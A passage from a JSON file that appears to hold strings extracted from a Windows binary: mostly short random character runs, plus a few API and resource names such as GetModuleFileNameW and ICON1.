                "[QT,",
                "%B~>",
                "t-cr",
                "R8B2",
                "1 eB",
                "$q%RZ>",
                "} 6:",
                "/#<R",
                "`#|,s",
                "\"! ]1b",
                "2`|*",
                "1dC8",
                "@A\"\"",
                "1C2b",
                "2Tzq\\",
                ".Xj2",
                "d~qx",
                "\\C\"@ ",
                "R5J2",
                "gC9C",
                "pxRc",
                "2y{a",
                "Tb<P",
                "SP\"Q",
                "`K2@h2",
                "S`H3}1",
                "at;C",
                "*\"T#qQ",
                "!P9Q",
                "Dc&Q9",
                "q2PD",
                "q T,",
                "#Chs",
                "-9`9",
                "c@/3",
                "3He@!",
                "%S!41",
                "S`)s",
                "ZO\"O",
                "\"\\'a\\FO",
                "H)B`T\"",
                "~`6z",
                "-<$1",
                "tKBl",
                "s\"B8y",
                "r92AT",
                "wK;&",
                "s^<q",
                "~#)/1e",
                "R)97k",
                "AI3\"Z",
                "<Nr#",
                "$L+HQl",
                "/^)i",
                "[nl$",
                "2@_F",
                ";#'g",
                "EK]>",
                "SB:F",
                "QsY~",
                "A)Nv",
                "D_&|^",
                "4TZ1",
                "2|<*BI",
                "6s\\,",
                "Q?Bx",
                "S,B#0{",
                "#e{ER",
                "%r!'",
                "[B&3",
                "q\\`Q",
                "G3&q",
                "r!R%",
                "rk&r",
                "Gg-G",
                "#h{H^",
                "hq} <",
                "y~\"9",
                "C)B>",
                "`8b:q",
                "Rp 4",
                "[2&?!",
                "[2&iQ",
                "9CJ&",
                "0ek\"",
                "+}24",
                "_;82#",
                "0yp^",
                "\"ivy",
                "`va&J.K",
                "p;c\\",
                "EdssP",
                "MG '",
                "y!J&",
                "qtb;s",
                "p'}0&",
                "sypF",
                "9 J>-",
                "sPt&",
                "}kpP\"",
                "yCJ>",
                "3;*r",
                "aQWv",
                "y2Gr",
                "{Qn9",
                "MVCB",
                "s9@J>",
                "}*QB)",
                "A I=",
                ")ZSP",
                "@LWr}",
                "&q9w",
                "B>}2",
                "!>AQ",
                "I&pd",
                "=B&V",
                "1Py0V",
                "a}EL",
                "p9QJ&",
                "^&6&",
                ":#&;",
                "_SRq",
                "{q!\"",
                ":P&1",
                "3;6#",
                "~K&00C",
                "*2BE",
                "B<bz6",
                "Bxqc",
                "{)^}",
                "=#j6",
                "/i~2",
                "G:?k#",
                "BGqB",
                "b|pB",
                "N1zM",
                "0x&3@",
                "!1{A",
                "P}p`",
                "b|2d",
                "9qLb",
                "VpB&",
                "PpB ",
                "p!QN",
                "rt&3R",
                "B|st'",
                "K<SR",
                "<p=c",
                "rt&s9",
                "B#!tb",
                "DhBS",
                "Se,s",
                "~b>9|",
                "v9}A",
                "9~e9f9D",
                "KqST",
                ":=|1",
                "/iz2I\"",
                "\".S!r",
                "9~P9~",
                "0?x3P",
                "%jqB",
                "H*1g8",
                "~E9|",
                "s\\'o",
                "(-|z",
                "9~j9~F",
                "s&PQ",
                "}2g6",
                "&\"oq",
                "b:@r",
                "):y2",
                "T\"`X@",
                "/v&*",
                "atJ1",
                "_cRxq",
                "-|51",
                "e(0}",
                "R6U4",
                ".0r2",
                "C\\^DF",
                "H]+qa",
                "fQx`",
                "Wh~}",
                "iSr~",
                "qr6+3/",
                "57MF",
                "&>![",
                "V@r|",
                "p-iQ",
                "dPHs",
                "i}I#M",
                "3wY P",
                "=1>0",
                "SrsHS",
                "%A+t",
                "%6-?",
                "9)(cK",
                "8JD$",
                "4$hz",
                "FVKS",
                "D$(>We",
                "4/?(3",
                ")^^\\",
                "$Rh,",
                "4$P:",
                "=C;Br",
                "=KS$4",
                "/>40",
                "GetLocalTime",
                "_4ZZ",
                "//lB",
                "b_b+",
                "wUA5+",
                "yK%@bv&Qw",
                "^_gL",
                "*kCU",
                "_b2PP\"",
                "|B.8",
                "|1)WUK",
                "a8RX",
                "xmr ",
                "XSd1J",
                "EA\",,",
                "vD (I)",
                "ixo ",
                "BLt#",
                "Qv:l",
                "R\\Q%",
                "jP<C[Q",
                "ldJBE]",
                "BxLR",
                "_s)P^",
                "/sE)?",
                "&Jl0",
                "Nj60",
                "!zB`",
                "\\8GI",
                "0KGA",
                "X^7'",
                "eAs)7",
                "Z=OrXiUE",
                "$F77",
                "<$`hhf",
                "4$Gh",
                "sLtE",
                "^w_bKO",
                "5Oo1",
                "h}M!",
                "6OgV[",
                "=aW;-",
                "gH1u",
                "(y9Z",
                "T,lZvyx0",
                "fFGG",
                "\\$Dh",
                "mA*3",
                "[;V5",
                "&7 Ao+%",
                "[:\\G;",
                "<)=jg",
                "ep6[",
                ")Qk/Tv",
                ")[e-",
                "?KK:",
                "33$yC;!",
                "Q&&g4",
                "S<<}",
                "P|R$<",
                "0bR&",
                "psK%",
                "nERe*\\",
                "dx9\\p'~",
                "%(1/7",
                "pvF,",
                "=yW#",
                "$@hYa",
                "&\"+;!",
                "KYTj`",
                "BV.4",
                "=]}Wfo",
                ". Nz",
                "zRD\"",
                "-i.OA",
                "W&2L",
                ";B~h",
                "Dv.[Cc",
                "e{~6",
                "2D|8",
                "NV=+",
                "+tli",
                "ZCPl",
                "kzm:.\\h",
                "q0QQ",
                "OO,19",
                "zq*,",
                "\"\"c]lMlv",
                "=kDjz",
                "{Q3;",
                "sI17",
                "lBsI?",
                "7xhM=",
                "NqJ3Yl",
                "8/N@",
                "D|(-eS",
                ":HwC",
                "}'sC*",
                "^ff<",
                "kE+Nr",
                "k/h'",
                "82t\\",
                "kEQ.",
                "NMu)n",
                "N|>]c",
                "bF,EE",
                "Zl]N",
                "+ek*E2",
                ",Gwe",
                "(KG4",
                "O{:49s",
                "Slnr",
                "]{}mH",
                "mw66AA",
                "`hk6",
                ".Xl: ",
                ";H)$2y",
                "6}b6.#`",
                "Ue#+",
                "wF={",
                "7m)$D",
                "VELK",
                "\"fH*",
                "p>]S",
                "Q-}KK",
                "8-<\"",
                "`|YV",
                "@T2r",
                "_2CwK",
                "fJd8",
                "pCkZv",
                "qYXi",
                "'}_F",
                "([Hp",
                "#cgX",
                "5\"sm",
                "zJ> ",
                "2Jp4",
                "Cmr{I",
                "Xd3D",
                "8,20-KE",
                "5Ck-%",
                "F?;<~2",
                "V;LZ",
                "JG%X",
                "gp_/",
                ",,::",
                "/]{+",
                "?4v;",
                "fw`='",
                "OuS'",
                "liD&.",
                "A5N\\y",
                "3&2SG|",
                "VRh*<",
                "$'Vf",
                "sO~FW",
                "vo@r~",
                "?xXM",
                "946*",
                "Kv?-",
                "9'\"~D",
                "\\I/%",
                "F.fz",
                "&b%xb#",
                "4@`.",
                "#)h;",
                "a=^V",
                "TX9oc",
                "vRZH",
                "*&#-",
                ";jT>",
                ":0HD",
                "FfL&Oui",
                "g~HQOc",
                ")[{!-",
                "nJrp",
                "'}pj",
                "W@5)",
                "~+5TV",
                "GetModuleFileNameW",
                "h7+q",
                "1uKw",
                "pnfB",
                "MYXi",
                ">;ln",
                "aDim",
                "i1bf",
                "uI#?",
                "WBpq@",
                "UjVeu",
                "G$/&",
                "J|n8&G",
                "Otk=",
                "R94m`#b4*",
                "HX]8",
                "\\j*:",
                ",0Tf",
                ",;Qq=",
                "G'r2",
                "R{3%",
                "a[z{I",
                "S1%Wc",
                "3h<<",
                "otxm",
                "#gI)",
                "AZ:F",
                ":f)5",
                "KH;4JL",
                "]oc`",
                "0.+x",
                "?qM/",
                "sO6=I",
                ":ES4a",
                ",vuM",
                "#M((*",
                "[+uSs",
                " %}2",
                "aY7'",
                "=V (",
                "WA X",
                "4\"C=",
                "wCw.8xh^F",
                "\"gY7",
                ")\\fZ",
                "Vk#5",
                ":S:&",
                " 2a>",
                "3~F;o",
                "1&AqT",
                "L@Dj",
                "0|a#",
                "r:7\"",
                ">r#q",
                "#=QT",
                "q8E'",
                "?E|>4zU",
                "C\\:$",
                "I%/_",
                ")7DV",
                "C4{>B+t",
                "[?V3",
                "f:.Q",
                "FVoZu",
                "b&2>",
                "b;r~2",
                "p'\"Y",
                "b6:w",
                "7}&M>",
                "GPNx",
                " ko/",
                "Yu_'$N",
                "EyJ}",
                "=a\\:",
                "]oOx",
                ":_>X!",
                "UZhz",
                "-~0X",
                "BD<R6",
                "xbF9",
                ";cms",
                "ci6PI",
                "CD3~",
                "0l\\x",
                "I&4~",
                "@3} r",
                "Z]p\\ ?&O",
                ">H^Sl",
                "^\\kP",
                ")Vc\"r",
                "I2I\\<",
                "SQDn",
                "&@$X",
                "04,m",
                "fej+",
                "P+]M",
                "S+&b",
                "D:F2",
                "9D~V",
                "`JW2",
                "*{0~",
                ".ELz",
                ">C#2",
                "0c&)>",
                "t~*VQ",
                "y && e",
                "N\"0;",
                "lJ\"3",
                "<VxK",
                "H')S",
                "4uFQ",
                "B!FAR ",
                "~{RW",
                "m2WOv",
                "M<4f",
                "6CU*,*$",
                "8S*er",
                "%E92",
                "0&j#I",
                "nt>Ja",
                ": O8x",
                ">6Y-",
                "n?5uL",
                "2\"^U",
                "\"Y=[",
                "8ULr",
                "7,/lA",
                "nj]Oz`y",
                ",3/h",
                "g,y~a$",
                "+vlt",
                "}=La",
                "qSlS",
                "o_-(",
                "xG)>",
                "z{.W=",
                "hZSaB1",
                "QR{K",
                "]S]{:\"",
                "s!S?",
                "pAIz",
                "1Z$8",
                "va:rq",
                "5e,%",
                "i]63",
                "cP\"f",
                "!+vC",
                "<u2>",
                "}2oAh",
                "|23~\\",
                "F@aB",
                "\"c#w#",
                "x=#a",
                "\"\"2z",
                "yDSb",
                "zCF2 ",
                "K1d,@",
                "kba8)",
                "Rw~5$@",
                "YvA>",
                "?L(cN",
                ";2.\"",
                "l >o",
                "cA`ym~",
                ":#Cr",
                "Y\"czs",
                "VD2Q",
                "[ _}G",
                "7XmKqU",
                "g:fB*",
                "kX25",
                "WeCK\\O.S9",
                "z23W",
                "@ v*",
                "U]fccB",
                "Y3C+",
                "_QVK",
                "uN~~",
                "&0IB@",
                "Jn@h",
                "g7P*j",
                "xEo{",
                "33+>",
                "{}+;",
                "Ikm.p",
                "YeX}",
                " C.*",
                ",:z!",
                "wo-I",
                "{&w]B",
                "wy1[J",
                "\"B=zS",
                "y(g\"wa",
                "s\"o!>",
                ")E.C5b",
                "1,Vc",
                "%lB{",
                "O!(9",
                "o-DZ",
                "1.f:",
                "}\"A ",
                "zp1#8",
                "c?\"}",
                "An(\"U",
                "aG(9",
                "\"#rzC",
                "A> #B",
                "p[> #",
                "xF ,n",
                "c8':",
                "L)I(",
                "L.<0",
                "[aTXx",
                "\\:.b",
                "j.`@",
                "#Ucyd0",
                ",tCt",
                "c.[N",
                "9L&W",
                "e5];",
                "-XPk",
                "n?~R",
                " v9Wk",
                "xX7c",
                "\\[z9",
                " ,[J",
                "L28=",
                "vOeL05",
                "op%p",
                "l#J;z",
                ">A.v(z",
                "<.Zl",
                "o'2u!",
                ";7lyA.]",
                "r!~l",
                "krts",
                "Sr>u",
                "BEbf",
                "\"5k]",
                "FP2hsu",
                "Rz1 ",
                "/S}3",
                "\"#BV",
                "cMI\"",
                "f !:",
                "r#Qz",
                "zp j2>l0",
                "=y8:",
                "0\"_-",
                "#NBD%",
                "nL#-",
                "cQ  ",
                "`]Pf",
                "2`h:",
                "*8\"@K",
                "m+P\"L",
                ";q+k",
                "XtzxC",
                "8@fi",
                ",qGxu?",
                "/e|kj",
                "XI]L",
                "2l#C",
                "y]Lg",
                "#Gt:",
                "x C|",
                " *Z&",
                "L;k`^",
                "zQvRKS ",
                ".E%s",
                "~}3:",
                "yi3=",
                "yw#s",
                "eU>R",
                "(QF5p",
                "\"oQ%",
                ">_op",
                "AN\\O",
                "1mI0c",
                "Hi1c^J",
                "2)om",
                "zpWH2",
                "qQXFc2",
                "<7#f\"w",
                "U'4kBl",
                "e,o|I",
                "@d4G",
                "ftGb",
                "9?PA",
                ":p~(W",
                "bPi ",
                "lML&I",
                "M9!y",
                ",s#ub",
                "Ww \"",
                "{2^r",
                "0E~39:",
                "R| 8",
                "o<aZ",
                "'p* ",
                "E{Y^E",
                "2zqb",
                "~#Qb",
                "AmHSA",
                "qQGu",
                "0U~P",
                "Q<qQ",
                ")B?U",
                "pl'u1",
                ",; U",
                "\"*U~5",
                ",tz\"",
                "s0x# ",
                "*,_#",
                "rLr&D",
                ">qQu",
                "8hRh",
                ".hZ$",
                "2!w=",
                "avDv",
                "269\"N",
                "bPRdz",
                ",n;0I",
                "Su&sA",
                "MEsg",
                ":!v.",
                "I{xL",
                "0&L`E",
                "Dc+#",
                "f&-:",
                "F`@4",
                "<l8y",
                "}:JC",
                "N(a[=2",
                "ZX3D",
                "7cJn",
                "$Qhz",
                "CuZXbb",
                "NQ[T",
                "qr+&",
                "UvY#",
                "~1^R",
                "Wbp&",
                "N%M|C(",
                "{?(UN",
                "-IvxQ",
                "z@;9~",
                "^6oO",
                "up92B",
                "!I40",
                "2AWr",
                "KrOIc",
                "(wlK2",
                "D,7U",
                "@z5[",
                "#n!@`#",
                "Nq;w`:",
                "r7qV",
                "#TA>ki",
                ")2>1\\!bR",
                "Dxeq",
                "?lI2",
                "Fz=F",
                "}c@Z",
                "4.ev",
                ">s>wr",
                "0.=k",
                "/m?~",
                "uMx ",
                "\"IEQ",
                "Uf W",
                "u)4m(",
                ":q\"n",
                ",LB^",
                "z+?z",
                "*/<.2t",
                "Mj)?J",
                "bM]r",
                "\">\"4",
                ":]U#a",
                "hRr7",
                "f[ @",
                "Q`Na4",
                "Dc2FXN1",
                "8b/4",
                "?#\"X1$z=",
                "ly5`\\Q",
                "h[my?",
                "?m#J",
                "/Ai%",
                "nljs",
                "O6K+",
                "82'Q",
                "H3u{",
                "7^Hc",
                "\"h7i=w",
                "8K7a",
                "3H.+",
                "V\" !Y",
                "*t*{",
                "<_R:",
                "IMLe",
                "q6zo",
                "9KoYQ6F",
                "jr7s",
                "c$9]V",
                "_|3y",
                "5|1W",
                "[+CC",
                "J&W^",
                "p I:]",
                "Kzcg",
                "8E\"c",
                "-,6qjQ",
                "O.#}\"",
                "iX@F",
                "6<IC",
                "eM=B",
                "vY%f",
                "Jq@a8",
                "Mb2>U@!",
                "o2!m",
                "\"GIc<",
                "Y'2r",
                "aIjz",
                "Ly7:h",
                "'fH!g",
                "zLn&",
                " 'd-",
                " P35",
                "c'~2",
                "Gpy|",
                "OgT*",
                "3#'pN",
                "j<#R",
                "^W\"o",
                "mer_",
                "f@;i",
                "ZaOo",
                "<@aR",
                "S7@r}",
                "D5e(",
                "Gw\":sm",
                "i[pU",
                "i^a8",
                "iEbS",
                ".4GB.",
                "3OPG",
                "W3[OK",
                "%Sr\\",
                "?*)7",
                "_rKH",
                "5f.\"K",
                "+S1l",
                "y/BIc",
                ";sJF",
                "fHar",
                "LRJyJ",
                "BB,T",
                "yPzCQ",
                "NcNy8",
                "A>q;",
                "p0)RU",
                "t\"Dz",
                "a@3`",
                "=Ze3=b",
                "|<B/",
                "C4=_",
                "(*a-",
                "[c3;",
                "rFqcv[",
                "^K,C",
                "jFCf",
                "k0`q",
                "#vxc",
                "YoT;",
                "-0r$",
                "*ob/",
                "=]<O@",
                "m.C7",
                "\"iHn",
                "$b\"<m",
                "~'P2$#Y",
                "iQmw",
                "qFWAc",
                ".{RO",
                "7sQ:",
                "@Uycu:",
                "Xh9&",
                "}T9?M",
                "|~$zR4",
                "#eX#Z",
                "=x@\"",
                "V#B>",
                "&@`f ",
                "tj*h",
                "AVK}",
                "/whx",
                ">j02",
                "c:6f",
                "%t!R$]",
                "EOfOC",
                "\"Q,Ca",
                "!u0\"",
                "@Q<r0",
                "HIGs",
                "}wsx'zI}",
                "Go@{",
                "^c(v",
                ":KCp",
                "feiG",
                "NozZ+",
                ".NUU",
                ",1R]",
                "8$?qI",
                "8k=B",
                " ?)(",
                "\\:*^;",
                "0Wor",
                "M\"Fe",
                "SO\"H",
                "I:>]!",
                "_o-H.",
                "#1S(",
                "s:U:",
                "(=;:",
                "q;dRS",
                "%N]O1",
                "o&64",
                "rE\"p'",
                "f?S-",
                "v`o>",
                "}!FW5",
                "QIg!",
                "KA2W",
                "\"7Yb",
                "#^\"Y",
                ");V~O",
                "u9Q 6",
                "8p~0",
                "pjFr",
                "cfD!Rt]",
                "3&B>8",
                ":\"E>",
                "W=Ms",
                ".Lc\\q3",
                "\"*S>",
                ">&N,",
                "],s]",
                "m_y*",
                "oB~R",
                "Eff@",
                "vhJ&:",
                "LG~{rq",
                "]rC?",
                "mqJ`",
                "o%C!Rs]",
                "4Z*o",
                "M=bPS",
                "W~8l",
                "gH W",
                "44q:",
                "M/2\\",
                "L~\"c/o",
                ":>3k",
                "2.o0",
                "aY1oR",
                "gYJmO",
                "-P{.@",
                "Awxk",
                "yhw,4",
                "F]Z$",
                " I\"_",
                ":ng.5",
                "c\"w\"",
                "C:yr",
                "ICON1"
            ]
        }
    ]
}